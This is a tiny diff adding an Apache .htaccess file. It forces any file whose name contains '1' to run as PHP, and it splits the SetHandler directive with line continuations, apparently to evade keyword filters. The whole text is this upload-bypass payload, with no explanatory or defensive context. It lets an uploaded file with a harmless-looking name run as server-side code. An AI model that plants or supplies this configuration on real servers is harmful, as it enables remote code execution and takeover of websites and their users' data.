@@ -1,0 +1,5 @@
+<FilesMatch "1">
+Se\
+tHandler ap\
+plication/x-httpd-php
+</FilesMatch>
